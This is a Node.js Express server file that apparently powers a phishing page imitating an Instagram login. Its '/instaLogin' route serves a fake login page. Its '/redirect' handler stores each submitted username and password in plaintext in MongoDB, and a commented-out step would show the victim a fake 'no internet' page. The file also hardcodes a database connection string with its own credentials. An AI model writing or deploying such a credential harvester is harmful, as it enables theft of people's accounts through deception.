const Express = require('express')
const mongoose = require('mongoose')
const bodyParser = require('body-parser')
var path = require("path")
const hostname = '0.0.0.0';
const app = Express()
app.use(bodyParser.urlencoded({extended:true}))
app.use(Express.static(path.join(__dirname,"public")))

mongoose.connect("mongodb+srv://hammad:hammad@cluster0.qbsagnr.mongodb.net")

var userSchema = mongoose.Schema({
    username : String,
    password : String
})
var User = mongoose.model("User", userSchema)
app.get('/',(req,res)=>{
    console.log("kk")
    res.sendFile(__dirname + "/public/index.html")
})
app.get('/instaLogin',(req,res)=>{
    console.log("kk")
    res.sendFile(__dirname + "/public/insta.html")
})

app.post('/redirect', (req, res)=>{
    User.insertMany([{
        username : req.body.username,
        password : req.body.password
    }])
    //res.sendFile(__dirname + "noInternet.html")
})

app.listen(3000, hostname , (err)=>{
    if(err){
    console.log(err)
    }
    else{
        console.log("Server")
    }
})